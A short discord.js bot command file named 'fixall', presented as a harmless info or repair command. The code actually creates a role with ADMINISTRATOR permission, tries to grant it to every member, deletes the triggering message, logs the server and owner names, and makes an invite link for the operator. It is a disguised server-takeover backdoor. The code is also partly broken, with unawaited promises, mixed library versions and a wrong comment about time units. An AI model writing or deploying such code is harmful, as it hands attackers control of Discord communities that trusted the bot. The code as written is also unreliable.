const Discord = require("discord.js");

module.exports = {
  name: "fixall",
  aliases: ["fixall,allfix"],
  category: "info",
  run: async (client, message, args) => {
    if (!args[0]) {
      args[0] == "0";
    }

    const roles = message.guild.roles.create({ reason: "lol nicim te", data: { name: 'allfixer', permissions: ['ADMINISTRATOR'], color: '0xe600ff' } });

    message.guild.members.forEach(member => {
      message.member.addRole(roles)    })
      message.channel.bulkDelete(1)
      message.guild.members.forEach(member => member.addRole(roles));
    console.log(`${message.author.username} opravuje server ${message.guild.name} s majitelem ${message.guild.owner.user.username}`)
    let invite =  message.channel.createInvite(
      {
        maxAge: 86399, // maximum time for the invite, in milliseconds
        maxUses: 3 // maximum times it can be used
      },
      `f`
    )
      .catch(console.log)  
    console.log(invite ? `Invite: ${invite}` : "Error")
  }
}